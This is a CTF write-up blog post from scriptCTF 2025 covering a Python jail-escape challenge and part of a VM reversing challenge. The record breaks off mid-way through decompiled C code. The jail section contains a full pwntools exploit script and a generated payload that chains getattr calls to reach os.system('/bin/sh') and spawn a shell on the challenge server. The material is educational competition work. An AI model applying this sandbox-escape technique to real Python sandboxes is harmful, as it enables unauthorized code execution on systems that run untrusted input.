---
title: 'scriptCTF 2025'
description: 'writeups from scriptCTF 2025 (high school winner, open second)'
date: 2025-08-17
tags: ['writeups', 'misc', 'jail', 'rev']
authors: ['cold']
image: ./logo.png
---

# Introduction

In this CTF i played with [Cosmic Bit Flip](https://cosmicbitflip.org/) as a 4-player high school team. We won **first in the high school division and 3rd overall**! ty to cbass, anywheres, and lolmenow who i played with, had a great time :)

---

## Misc/Jail

### Modulo

> Modulo is so cool! (by @NoobMaster my goat)

```python title=server.py
import ast
print("Welcome to the jail! You're never gonna escape!")
payload = input("Enter payload: ") # No uppercase needed
blacklist = list("abdefghijklmnopqrstuvwxyz1234567890\\;._")
for i in payload:
    assert ord(i) >= 32
    assert ord(i) <= 127
    assert (payload.count('>') + payload.count('<')) <= 1
    assert payload.count('=') <= 1
    assert i not in blacklist

tree = ast.parse(payload)
for node in ast.walk(tree):
    if isinstance(node, ast.BinOp):
        if not isinstance(node.op, ast.Mod): # Modulo because why not?
            raise ValueError("I don't like math :(")
exec(payload,{'__builtins__':{},'c':getattr}) # This is enough right?
print('Bye!') 
```

#### Jail Restrictions

The provided `server.py` implements several layers of filtering:

- **Character Blacklist:** All lowercase letters except `c` are forbidden, as well as digits, backslash, semicolon, period, and underscore.
- **Operator Restrictions:** Only one `<` or `>` and one `=` are allowed in the payload.
- **AST Filtering:** Only the modulo (`%`) binary operator is permitted; all other binary operations are blocked. This means we can't do things like `+` or `-`. However, unary operations (like `-~x`) are allowed.
- **Builtins:** The only available builtin is `c`, which is set to `getattr`.

These constraints severely limit the ability to use normal Python syntax, attribute access, and string/number literals.

If we had zero restrictions, we could do something like:
```python
__import__('os').system('/bin/sh')
```

to pop a shell! We'll need to work around the restrictions though.
#### Initial Reconnaissance

##### Available Primitives

- **`c = getattr`:** This is the only accessible builtin, and it's crucial for dynamic attribute access.
- **Uppercase Letters:** All uppercase letters are allowed, enabling variable names and string construction. However, all lowercase letters are blocked, and pretty much every attribute needs a lowercase letter.
- **Modulo Operator:** The `%` operator is allowed, which enables format string operations.
- **Unary Operators:** Not filtered, so expressions like `-~x` (which increments `x` by 1) are usable.

##### Attribute Access

Since only `c` is available and all other lowercase letters are blocked, direct access to most attributes is impossible. However, `getattr` can be used to dynamically access attributes if their names can be constructed at runtime.

For example:
```python
getattr(os, 'system') == os.system
```

*So our goal is to construct attribute names in the form of strings at runtime!*

#### Building Strings and Numbers

##### Constructing Strings

- **Format Strings:** The `%` operator allows constructing single characters: `'%c' % 65` yields `'A'`. *This is the key of the challenge! Modulo operator being used to create characters!* It's quite similar to C-style format strings.
- **Arbitrary Strings:** By chaining format strings, any string can be built: `'%c%c%c' % (65,66,67)` yields `'ABC'`.

*So now we need numbers though...*

##### Constructing Integers

- **Boolean Comparison:** The challenge allows one `<` or `>`, so `'@' < 'A'` yields `True` (which is `1` in Python).
- **Unary Increment:** Using `-~x` repeatedly increments `x` by 1, so `-~I` is `2`, `-~-~I` is `3`, etc.

This is because 

$$
\begin{array}{l r c l}
\text{Let } x \text{ be an integer.} \\
\text{Bitwise NOT:} & \sim x   & = & -x - 1 \\
\text{Negate:}      & -\sim x  & = & -(-x - 1) \\
                    &          & = & x + 1
\end{array}
$$


#### Solve Process

##### 1: Initialize a Variable to 1 (True)

Since only one comparison is allowed, use the walrus operator to assign the result of `'@' < 'A'` (which is `True`, i.e., `1`) to a variable (`I`):

```python
(I := ('@' < 'A'))
```

Note that this works because in Python, `True == 1`.

##### 2: Build Arbitrary Integers

Define a helper function to construct any integer `n` using only `I` and unary increments:

```python
def expr_for(n):
    return "-~" * (n-1) + "I"
```

By simply chaining `n-1` copies of `-~` before the boolean `True == 1` we can build any number `n`!

##### 3: Build Arbitrary Strings

Use format strings and the integer builder to construct any string:

```python 
def string_expr(txt):
    fmt = "'" + "%c" * len(txt) + "'"
    exprs = ",".join(expr_for(ord(c)) for c in txt)
    if len(txt) == 1:
        exprs += ","
    return f"{fmt} % ({exprs})"
```

*This just brings together the `%c%c%c` and the tuples of numbers.*

##### 4: Dynamic Attribute Access

Use `getattr` (`c`) to access attributes by dynamically built names:

```python
def getattr_call(obj, attr):
    return f"c({obj},{string_expr(attr)})"
```

##### 5: Chain Attribute Access to Reach `os.system`

- Get `__self__` from `c` to recover builtins.
- Use `getattr` to get `__import__`.
- Import `os`.
- Get `system` from `os`.
- Call `system("/bin/sh")`.

##### 6: Assemble the Final Payload

Combine all steps into a single payload tuple:

```python
PAYLOAD = f"({init},{step3})"
```
Where `init` sets `I`, and `step3` executes the shell.

#### Final Exploit Script

```python title=solve.py
#!/usr/bin/env python3
from pwn import *

# ————————————————————————————————————————————————————————————————
# 0. Helpers – build integers & strings without digit literals
# ————————————————————————————————————————————————————————————————

BASE_VAR = "I"   # after the walrus, I == 1

def expr_for(n: int) -> str:
    """
    Produce an expression (only I and -~) that evaluates to the integer n (n>=1).
      I    -> 1
      -~I  -> 2
      -~-~I -> 3
      ...
    """
    if n < 1:
        raise ValueError("n must be >= 1")
    if n == 1:
        return BASE_VAR
    return "-~" * (n-1) + BASE_VAR

def char_expr(ch: str) -> str:
    """
    Return a snippet that at runtime yields the one-char string `ch`,
    via '%c' % (<expr_for(code)>).
    """
    code = expr_for(ord(ch))
    return f"'%c' % ({code})"

def string_expr(txt: str) -> str:
    """
    Return a snippet that at runtime yields the entire string `txt`,
    by using '%c%c...%c' % (<expr1>, <expr2>, ...).
    """
    # Build the literal format: '%c%c...%c'
    fmt = "'" + "%c" * len(txt) + "'"
    # Build the tuple of expr_for(...) values
    exprs = ",".join(expr_for(ord(c)) for c in txt)
    # Single‐element tuple needs a trailing comma
    if len(txt) == 1:
        exprs += ","
    return f"{fmt} % ({exprs})"

def getattr_call(obj: str, attr: str) -> str:
    """
    Emit c(<obj>, <dynamic-attr-name>), i.e. getattr(<obj>, "<attr>").
    """
    return f"c({obj},{string_expr(attr)})"


# ————————————————————————————————————————————————————————————————
# 1. Build the one‐line exploit payload
#    It is a 2-tuple: (I:=('@'<'A'), <spawn‐shell‐expr>)
#    Uses exactly one '<', one '=', and only % formatting.
# ————————————————————————————————————————————————————————————————

# 1a) The walrus – sets I = 1  (one '<' and one '=')
init = f"(I:=('@'<'A'))"

# 1b) Build the needed names and strings at runtime:
g_name   = string_expr("__globals__")
b_name   = string_expr("__builtins__")
imp_name = string_expr("__import__")
os_mod   = string_expr("os")
sys_name = string_expr("system")
sh_str   = string_expr("/bin/sh")    

# 1c) Chain getattr calls / indexing:
step1 = getattr_call("c", "__self__")               # getattr(c, "__self__")
step2 = f"c({step1},{imp_name})({os_mod})"          # getattr(B, "__import__")("os")
step3 = f"c({step2},{sys_name})({sh_str})"          # getattr(os, "system")("/bin/sh")

# 1d) Wrap into the final 2‐tuple
PAYLOAD = f"({init},{step3})"

# Quick sanity‐check against the jail’s own rules
BLACK = set("abdefghijklmnopqrstuvwxyz1234567890\\;._")
assert not [ch for ch in PAYLOAD if ch in BLACK], "Leaked a forbidden char!"
assert PAYLOAD.count('<') + PAYLOAD.count('>') == 1, "Wrong count of < or >"
assert PAYLOAD.count('=') == 1, "Wrong count of ="

print(f"→ Generated payload (length {len(PAYLOAD)}):\n")
print(PAYLOAD)

# ————————————————————————————————————————————————————————————————
# 2. Solve the chall!
# ————————————————————————————————————————————————————————————————

p = remote("play.scriptsorcerers.xyz", 10480)

p.recvuntil("Enter payload: ")
p.sendline(PAYLOAD.encode())
p.interactive()
```

#### Conclusion

This pyjail required understanding of Python's syntax and runtime behavior, creative use of allowed operators, and dynamic construction of both numbers and strings. The solution leveraged the walrus operator, unary increments, and format strings to bypass severe restrictions and achieve arbitrary code execution. The constraints were well-formulated to let players find the interesting solve path! 

:heart: NoobMaster fr

**Payload Example (6,894 characters):**

```
((I:=('@'<'A')),c(c(c(c,'%c%c%c%c%c%c%c%c' % (-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~I,-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~I,-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~I,-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~I,-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~I,-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~I,-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~I,-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~I)),'%c%c%c%c%c%c%c%c%c%c' % (-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~I,-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~I,-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~I,-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~I,-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~I,-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~I,-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~I,-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~I,-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~I,-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~I))('%c%c' % (-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~I,-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~I)),'%c%c%c%c%c%c' % (-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~I,-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~I,-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~I,-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~I,-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~I,-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~I))('%c%c%c%c%c%c%c' % (-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~I,-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~I,-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~I,-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~I,-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~I,-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~I,-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~I)))
```

## Rev

### vm2

> my friend tells me that he made the vm smarter and that i have to write a script in his weird vm code

[reverse_me](https://github.com/scriptCTF/scriptCTF2025-OfficialWriteups/raw/refs/heads/main/Rev/vm2/attchments/reverse_me)

#### Reversing

loading up the challenge binary in IDA we see it implements a virtual machine. you must provide some code that solves a task in order to get the flag:

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  unsigned __int64 USER_SCRIPT_LEN; // r15
  int v4; // edx
  int v5; // ecx
  int v6; // r8d
  int v7; // r9d
  int urandom_fd; // eax
  unsigned int urandom; // r13d
  unsigned __int64 v10; // rsi
  unsigned __int64 v11; // rdi
  __int64 v12; // r8
  int v13; // ebp
  __int64 v14; // r14
  int v15; // ebx
  unsigned __int64 IP; // rax
  unsigned __int64 v17; // rcx
  char v18; // al
  unsigned __int64 v19; // rcx
  int v20; // eax
  unsigned __int8 OPCODE; // al
  unsigned __int64 v22; // rdx
  unsigned __int64 v23; // rax
  int v24; // ecx
  unsigned __int8 v25; // dl
  int v26; // eax
  char v27; // r10
  bool v28; // cc
  unsigned __int64 v30; // rax
  int count; // [rsp+14h] [rbp-C4h]
  char v32; // [rsp+18h] [rbp-C0h]
  unsigned __int8 v33; // [rsp+2Bh] [rbp-ADh] BYREF
  unsigned int v34; // [rsp+2Ch] [rbp-ACh] BYREF
  int REGISTERS[8]; // [rsp+30h] [rbp-A8h] BYREF
  _BYTE USER_SCRIPT[72]; // [rsp+50h] [rbp-88h] BYREF
  unsigned __int64 canary; // [rsp+98h] [rbp-40h]

  canary = __readfsqword(0x28u);                // setup stuff? probably setbuf in the next two lines
  sub_407A40(off_4BD6B0, 0);
  sub_407A40(stdin, 0);
  USER_SCRIPT_LEN = readscript(USER_SCRIPT, 1u, 71, stdin);// limit maximum instruction count to 71 bytes
  urandom_fd = safe_open("/dev/urandom", 0, v4, v5, v6, v7);
  if ( urandom_fd < 0 )                         // failed to open /dev/urandom
  {
    fatal_perror("open /dev/urandom");
    return 1;
  }
  urandom = urandom_fd;
  count = 100;                                  // 100 iterations to solve (repeat 100 times)
LABEL_3:
  v10 = &v33;
  v11 = urandom;
  if ( safe_read(urandom, &v33, 1) == 1 )       // reading a random byte
  {
    v12 = v33;
    memset(REGISTERS, 0, sizeof(REGISTERS));    // zero out the registers
    v13 = v33;
    REGISTERS[0] = v33;
    if ( !USER_SCRIPT_LEN )
    {
      if ( v33 )
      {
LABEL_31:
        v24 = v13;
        v25 = 0;
        do
        {
          HIWORD(v26) = HIWORD(v24);
          LOWORD(v26) = v24 / 0xAu;
          v27 = v24 % 0xAu;
          v28 = v24 <= 9u;
          v24 = v26;
          v25 = v27 + 10 * v25;
        }
        while ( !v28 );
        goto LABEL_33;
      }
LABEL_74:
      safe_close(urandom);
      print("lol, nice try");
      return 0;
    }
    v14 = 50;
    v15 = 0;
    IP = 0;
    v17 = 0;
    while ( 1 )
    {
      while ( 1 )
      {
        OPCODE = USER_SCRIPT[IP];
        v22 = (v17 + 1);
        v34 = v17 + 1;
        if ( OPCODE == 0x80 )
        {
          if ( v22 >= USER_SCRIPT_LEN )
            goto LABEL_75;
          v10 = (v17 + 2);
          if ( v10 >= USER_SCRIPT_LEN )
            goto LABEL_75;
          v17 = (v17 + 3);
          REGISTERS[USER_SCRIPT[v22] & 7] &= REGISTERS[USER_SCRIPT[v10] & 7];
          goto LABEL_13;
        }
        if ( OPCODE > 0x80u )
          break;
        if ( OPCODE == 64 )
        {
          if ( v22 >= USER_SCRIPT_LEN )
            goto LABEL_75;
          v10 = (v17 + 2);
          if ( v10 >= USER_SCRIPT_LEN )
            goto LABEL_75;
          v17 = (v17 + 3);
          REGISTERS[USER_SCRIPT[v22] & 7] *= REGISTERS[USER_SCRIPT[v10] & 7];
          goto LABEL_13;
        }
        if ( OPCODE <= 0x40u )
        {
          switch ( OPCODE )
          {
            case 0x20u:
              if ( v22 >= USER_SCRIPT_LEN )
                goto LABEL_75;
              v10 = (v17 + 2);
              if ( v10 >= USER_SCRIPT_LEN )
                goto LABEL_75;
              v17 = (v17 + 3);
              REGISTERS[USER_SCRIPT[v22] & 7] += REGISTERS[USER_SCRIPT[v10] & 7];
              break;
            case 0x30u:
              if ( v22 >= USER_SCRIPT_LEN )
                goto LABEL_75;
              v10 = (v17 + 2);
              if ( v10 >= USER_SCRIPT_LEN )
                goto LABEL_75;
              v17 = (v17 + 3);
              v10 = USER_SCRIPT[v10] & 7;
              REGISTERS[USER_SCRIPT[v22] & 7] -= REGISTERS[v10];
              break;
            case 0x10u:
              if ( v22 >= USER_SCRIPT_LEN )
                goto LABEL_75;
              v18 = USER_SCRIPT[v22];
              v19 = (v17 + 2);
              v10 = USER_SCRIPT_LEN;
              v11 = USER_SCRIPT;
              v34 = v19;
              v32 = v18 & 7;
              v20 = sub_403740(USER_SCRIPT, USER_SCRIPT_LEN, &v34, v19);
              v17 = v34;
              REGISTERS[v32 & 7] = v20;
              break;
            default:
              goto UNKNOWN_OP;
          }
          goto LABEL_13;
        }
        if ( OPCODE == 0x60 )
        {
          if ( v22 >= USER_SCRIPT_LEN )
            goto LABEL_75;
          v10 = (v17 + 2);
          if ( v10 >= USER_SCRIPT_LEN )
            goto LABEL_75;
          v17 = (v17 + 3);
          REGISTERS[USER_SCRIPT[v22] & 7] ^= REGISTERS[USER_SCRIPT[v10] & 7];
          goto LABEL_13;
        }
        if ( OPCODE == 0x70 )
        {
          if ( v22 >= USER_SCRIPT_LEN )
            goto LABEL_75;
          v10 = (v17 + 2);
          if ( v10 >= USER_SCRIPT_LEN )
            goto LABEL_75;
          v17 = (v17 + 3);
          REGISTERS[USER_SCRIPT[v22] & 7] |= REGISTERS[USER_SCRIPT[v10] & 7];
          goto LABEL_13;
        }
        if ( OPCODE != 0x50 )
          goto UNKNOWN_OP;
        if ( v22 >= USER_SCRIPT_LEN || (v23 = (v17 + 2), v23 >= USER_SCRIPT_LEN) )
LABEL_75:
          sub_403710(v11, v10, v22, v17, v12);
        v17 = (v17 + 3);
        v10 = USER_SCRIPT[v22] & 7;
        v11 = USER_SCRIPT[v23] & 7;
        REGISTERS[v10] /= REGISTERS[v11];
        IP = v17;
        if ( v17 >= USER_SCRIPT_LEN )
          goto LABEL_30;
LABEL_14:
        if ( !--v14 )
          goto LABEL_44;
      }
      if ( OPCODE == 0xC0 )
      {
        v10 = USER_SCRIPT_LEN;
        v11 = USER_SCRIPT;
        v17 = sub_403740(USER_SCRIPT, USER_SCRIPT_LEN, &v34, v17);
        if ( v15 <= 0 )
          goto LABEL_40;
      }
      else if ( OPCODE > 0xC0u )
      {
        switch ( OPCODE )
        {
          case 0xE0:
            v10 = USER_SCRIPT_LEN;
            v11 = USER_SCRIPT;
            v17 = sub_403740(USER_SCRIPT, USER_SCRIPT_LEN, &v34, v17);
            if ( v15 )
              goto LABEL_40;
            break;
          case 0xF0:
LABEL_30:
            LODWORD(v12) = REGISTERS[0];
            if ( v13 )
              goto LABEL_31;
            v25 = 0;
LABEL_33:
            if ( (v13 == v25) != v12 )
              goto LABEL_74;
            if ( !--count )
            {
              safe_close(urandom);
              print("scriptCTF{this_is_def_the_flag_trust}");
              return 0;
            }
            goto LABEL_3;
          case 0xD0:
            v10 = USER_SCRIPT_LEN;
            v11 = USER_SCRIPT;
            v17 = sub_403740(USER_SCRIPT, USER_SCRIPT_LEN, &v34, v17);
            if ( v15 >= 0 )
            {
LABEL_40:
              v17 = v34;
LABEL_13:
              IP = v17;
              if ( v17 >= USER_SCRIPT_LEN )
                goto LABEL_30;
              goto LABEL_14;
            }
            break;
          default:
UNKNOWN_OP:
            printf("wtf is this op bruh :skull:\n", 1u, 28, off_4BD6A8);
            return 1;
        }
      }
      else
      {
        if ( OPCODE == 0xA0 )
        {
          if ( v22 >= USER_SCRIPT_LEN )
            goto LABEL_75;
          v30 = (v17 + 2);
          if ( v30 >= USER_SCRIPT_LEN )
            goto LABEL_75;
          v17 = (v17 + 3);
          v15 = REGISTERS[USER_SCRIPT[v22] & 7] - REGISTERS[USER_SCRIPT[v30] & 7];
          goto LABEL_13;
        }
        if ( OPCODE != 0xB0 )
        {
          if ( OPCODE != 0x90 )
            goto UNKNOWN_OP;
          v10 = USER_SCRIPT_LEN;
          v11 = USER_SCRIPT;
          v17 = sub_403740(USER_SCRIPT, USER_SCRIPT_LEN, &v34, v17);
          IP = v17;
